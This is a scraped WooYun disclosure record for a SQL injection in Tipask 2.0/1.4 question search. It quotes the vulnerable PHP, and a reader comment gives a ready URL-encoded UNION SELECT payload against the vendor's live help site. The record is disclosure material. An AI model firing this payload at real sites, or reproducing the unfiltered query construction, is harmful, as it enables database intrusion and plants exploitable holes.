{"id": 17332, "wybug_id": "wooyun-2012-010866", "wybug_title": "Tipask!2.0、1.4sql注入", "wybug_corp": "Tipask", "wybug_author": "猪头子", "wybug_date": "2012-08-13 17:31", "wybug_open_date": "2012-09-27 17:31", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-09-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 之前也有人爆wps的sql注入，其实wps用的是这个系统 详细说明：  在control/question.php 的onajaxsearch函数中\nfunction onajaxsearch() {        $title = urldecode($this-> get[2]);        $questionlist = $_ENV[ 'question']->search_title($title, 2, 1, 0, 5);        include template('ajaxsearch' );}\n由get[2]传入的参数经过了urldecode再进入到question模块中的search_title函数里。\n//根据标题搜索问题    function search_title ($title, $status='1,2,6' , $addbestanswer=0, $start=0, $limit=20) {        $questionlist = array();        $search_words = $this->get_words($title);        $sql = $search_words ? \"SELECT * FROM \" . DB_TABLEPRE . \"question WHERE MATCH(search_words) AGAINST(' $search_words') AND status IN($status)\" : \"SELECT * FROM \" . DB_TABLEPRE . \"question WHERE STATUS IN ($status) AND title LIKE '%$title %' \";        $sql .= \" LIMIT $start, $limit\";        $query = $this-> db->query($sql);        file_put_contents( \"sql.txt\", $sql);        while ($question = $this->db->fetch_array($query) ) {            $question[ 'category_name'] = $this->base->category [$question['cid']]['name'];            $question[ 'format_time'] = tdate($question['time' ]);            $question[ 'url'] = url('question/view/' . $question['id'], $question['url']);            $addbestanswer && $question[ 'bestanswer'] = $this->db->result_first(\"SELECT content FROM `\" . DB_TABLEPRE . \"answer` WHERE qid=\" . $question['id'] . \" AND adopttime>0 \");//            $question['description'] = highlight(strip_tags($question['description']), $search_words);//            $question['title'] = highlight($question['title'], $search_words);            $question[ 'description'] = strip_tags($question['description' ]);            $questionlist[] = $question;        }        return $questionlist;}\n最终没有过滤进入sql查询。   漏洞证明：  官方演示站ooxx成功\n\n   修复方案：  过滤吧。。好多地方都没有过滤   版权声明：转载请注明来源 猪头子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2012-09-03 16:15 |    \t\t苦战 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:4        | 人称苦战？乃南方蛮荒之人！相平，谓正不如...)\t\t \n  用过这个系统 关注一下~    \n     2012-09-10 12:20 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  看来tipask打算死不认领。。    \n     2012-09-27 22:19 |    \t\tif、so  \t\t\t( 核心白帽子 |\t\t\t        Rank:1008 漏洞数:91        | 梦想还是要有的，万一实现了呢？)\t\t \n  万分加十分恳请洞主给个详细利用过程，邮箱：1141543093@qq.com，本人理论实在太差    \n     2012-09-28 08:52 |    \t\tw5r2 \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:52        )\t\t \n  @if、so 注入编码下就行了。    \n     2012-11-08 15:38 |    \t\thacx \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:6        )\t\t \n  @if、so看了一下model/tipask.class.phpfunction init_request() {\t$querystring = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';..........................        $this->get = explode('/', $querystring);//$_SERVER不受gpc影响,进行urlencode编码后,无视gpc..........................\tunset($GLOBALS, $_ENV, $HTTP_GET_VARS, $HTTP_POST_VARS, $HTTP_COOKIE_VARS, $HTTP_SERVER_VARS, $HTTP_ENV_VARS);        $this->get = taddslashes($this->get, 1);//该taddslashes函数在urldecode函数之前调用，产生问题了。        $this->post = taddslashes(array_merge($_GET, $_POST));        unset($_POST);..........................}http://help.tipask.com/?question/ajaxsearch/%73%73%73%27%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54%20%31%2C%32%2C%33%2C%34%2C%35%2C%36%2C%37%2C%38%2C%75%73%65%72%28%29%2C%31%30%2C%31%31%2C%31%32%2C%31%33%2C%31%34%2C%31%35%2C%31%36%2C%31%37%2C%31%38%2C%31%39%2C%32%30%2C%32%31%23    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}